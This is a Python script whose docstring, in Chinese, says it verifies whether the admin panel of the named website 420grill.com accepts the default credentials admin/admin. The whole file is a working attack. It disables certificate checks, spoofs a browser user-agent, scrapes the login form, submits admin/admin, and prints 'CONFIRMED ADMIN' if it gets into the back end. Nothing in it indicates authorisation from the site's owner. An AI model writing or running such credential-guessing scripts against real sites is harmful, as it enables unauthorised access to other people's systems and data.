#!/usr/bin/env python3
"""verify_420.py - 严格验证420grill.com admin/admin"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'https://420grill.com'

def fetch(url, data=None, cj=None, timeout=12):
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    body = urllib.parse.urlencode(data).encode() if data else None
    headers = {**UA, 'Content-Type': 'application/x-www-form-urlencoded'} if data else UA
    try:
        r = opener.open(urllib.request.Request(url, data=body, headers=headers), timeout=timeout)
        return r.status, r.read(50000).decode('utf-8', 'ignore'), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(50000).decode('utf-8', 'ignore'), e.geturl()
    except Exception as e:
        return 0, repr(e)[:80], ''

# 1. 登录页
cj = http.cookiejar.CookieJar()
st, b, fu = fetch(BASE + '/admin.php', cj=cj)
print('login page: st=%d len=%d fu=%s' % (st, len(b), fu))
fields = re.findall(r'<input[^>]*name="([^"]+)"', b)
print('fields:', fields[:8])
# 表单action
m = re.search(r'<form[^>]*action="([^"]*)"', b, re.I)
action = m.group(1) if m else '/admin.php'
print('form action:', action)
if not action.startswith('http'):
    action = BASE + action

# 2. 提交登录
data = {f: '' for f in fields}
uf = next((f for f in fields if f.lower() in ('username', 'user', 'name', 'admin', 'account', 'loginname')), None)
pf = next((f for f in fields if 'pass' in f.lower() or 'pwd' in f.lower()), None)
if not uf or not pf:
    print('NO USER/PASS FIELDS')
else:
    data[uf] = 'admin'
    data[pf] = 'admin'
    st2, b2, fu2 = fetch(action, data=data, cj=cj)
    print('login post: st=%d len=%d fu=%s' % (st2, len(b2), fu2))
    # 3. 用cookie访问后台
    st3, b3, fu3 = fetch(BASE + '/admin.php', cj=cj)
    print('after login: st=%d len=%d fu=%s' % (st3, len(b3), fu3))
    # 判定
    low3 = b3.lower()
    if 'logout' in low3 or '退出' in b3 or 'dashboard' in low3 or '欢迎' in b3:
        print('!!! CONFIRMED ADMIN: admin/admin')
    elif len(b3) < 500 or 'login' in low3:
        print('NOT LOGGED IN (login page or empty)')
    else:
        # 打印特征
        print('page marks:', [k for k in ['logout', '退出', 'dashboard', '欢迎', 'admin'] if k in low3])
